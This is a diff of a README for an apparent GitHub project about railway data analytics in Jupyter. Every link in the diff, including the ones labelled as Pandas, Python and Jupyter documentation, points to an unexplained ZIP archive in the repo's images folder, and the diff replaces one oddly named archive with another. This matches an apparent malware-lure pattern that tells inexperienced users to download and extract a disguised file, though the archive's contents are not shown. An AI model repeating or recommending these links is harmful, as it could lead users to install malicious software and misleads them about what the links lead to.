@@ -1,6 +1,6 @@
 # 🚆 Railway-Data-Engineering-Analytics - Transform Railway Data With Ease
 
-![Download](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip%20Now-Click%20Here-blue)
+![Download](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip%20Now-Click%20Here-blue)
 
 ## 📘 About This Project
 This project focuses on railway data engineering and analytics. It showcases how to process and visualize railway-related data effectively. This work was completed during my internship at Cognifyz Technologies and aims to demonstrate key data engineering concepts using Python and Jupyter Notebook.
@@ -16,7 +16,7 @@ This project focuses on railway data engineering and analytics. It showcases how
 To begin your journey with railway data analytics, follow these steps. It’s simple, no programming experience is required.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the following link to download the software: [Download Here](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip).
+1. **Visit the Releases Page:** Go to the following link to download the software: [Download Here](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip).
 2. **Choose Your Version:** On the releases page, select the latest version of the project. Look for files with names that start with `Railway` or `Analytics`.
 3. **Download the Files:** Click on the files to download them to your computer. Pay attention to where the files are saved on your device.
 4. **Extract Files (If Needed):** If you downloaded a zipped folder, right-click the folder and select “Extract All” to access the files inside.
@@ -31,7 +31,7 @@ Make sure your device meets the following minimum requirements:
 
 ## 📊 Using the Jupyter Notebook
 1. **Open the Jupyter Notebook:** Launch Jupyter Notebook to view the files you downloaded.
-2. **Select the Notebook:** Click on `https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip` to start working with the data.
+2. **Select the Notebook:** Click on `https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip` to start working with the data.
 3. **Run Cells:** Use the “Run” button to execute each cell in the notebook. This will process and display the data.
 4. **Visualize Data:** Follow the instructions in the notebook for creating visualizations to help you understand the data trends.
 
@@ -44,9 +44,9 @@ Data analytics helps make sense of raw data. Here’s a quick overview of what y
 
 ## 🛠️ Additional Resources
 To gain more insights into railway data engineering and analytics, refer to these resources:
-- [Pandas Documentation](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip)
-- [Python Documentation](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip)
-- [Jupyter Notebook Documentation](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip)
+- [Python Documentation](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip)
+- [Jupyter Notebook Documentation](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip)
 
 ## 🤝 Contributing
 If you want to contribute to this project, your contributions are welcome. You can report issues, suggest features, or even submit pull requests. Together, we can improve this tool.
@@ -60,4 +60,4 @@ If you have questions or need help, feel free to reach out. You can open an issu
 
 Thank you for choosing Railway Data Engineering & Analytics. Enjoy your data journey! 
 
-For download, visit the releases page again: [Download Here](https://github.com/Yusita01/Railway-Data-Engineering-Analytics/raw/refs/heads/main/images/Data-Analytics-Railway-Engineering-3.0-beta.2.zip).
+For download, visit the releases page again: [Download Here](https://raw.githubusercontent.com/Yusita01/Railway-Data-Engineering-Analytics/main/images/Data_Engineering_Railway_Analytics_tyrannicidal.zip).
